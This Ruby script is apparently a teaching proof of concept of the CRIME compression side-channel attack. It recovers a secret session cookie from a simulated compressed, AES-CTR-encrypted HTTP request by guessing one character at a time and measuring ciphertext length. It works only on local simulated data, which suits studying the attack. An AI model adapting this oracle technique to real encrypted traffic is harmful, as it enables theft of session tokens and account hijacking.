#!/usr/bin/env ruby
#technion@lolware.net

require 'zlib'
require_relative 'aesctr'

def testaes
    test = ">Implying this is a test string"
    test << test
    test << test
    cipher = AESCTR.new
    enc = cipher.endecrypt(test)

    decipher = AESCTR.new
    plain = decipher.endecrypt(enc)
    raise "AES-CTR broken" unless plain == test
    puts "AES-CTR tested"
end

def getrequest(str)
    cipher = AESCTR.new
    request = "POST / HTTP/1.1\nHost: hapless.com\n"
    request << "Cookie: sessionid=TmV2ZXIgcmV2ZWFsIHRoZSBXdS1UYW5nIFNlY3JldCE="
    request << "\nContent-Length: #{str.length}\n" + str
    #puts request
    compress = Zlib::Deflate.deflate(request) #, Zlib::BEST_COMPRESSION)
    encrypt = cipher.endecrypt(compress)
    return encrypt

end

testaes

#Build an array of valid characters
b64 = ['|'] #this is not a valid character but it serves to test for
            #whether the first score can be beaten
b64 |= (0..9).to_a
b64 |= ('a'..'z').to_a
b64 |= ('A'..'Z').to_a
b64.push('=')

brokenstring = "sessionid="

SESSIONSIZE = 44
(SESSIONSIZE).times do
    #Each iteration determines one character
    winningchar = '|' #Test = not a valid char
    winningcharcount = 9000 #Arbitrarily large
    b64.each { |b|
        #Check each character to see if it creates a winning length
        #https://docs.google.com/presentation/d/11eBmGiHbYcHR9gL5nDyZChu_-lCa2GizeuOfaLU2HOU/edit#slide=id.g1eb6c1b5_3_0 - page 29
        session = brokenstring + b.to_s 
        l = getrequest(session)
        if (l.length < winningcharcount)
            winningcharcount = l.length 
            winningchar = b
        end
        #puts "b is " + b.to_s + " l is " + l.length.to_s 

    }
    if winningchar == '|' 
        #Unsuccessful. Create a boundary and try again.
        winningcharcount = 9000
        b64.each { |b|
            #Append garbage, compressable data seemed most helpful
            l2 = getrequest('qwertyqwerty' + brokenstring + b.to_s )
            if (l2.length  < winningcharcount)
                winningcharcount = l2.length
                winningchar = b
            end
        }

    end
    
    brokenstring << winningchar.to_s
end

puts brokenstring
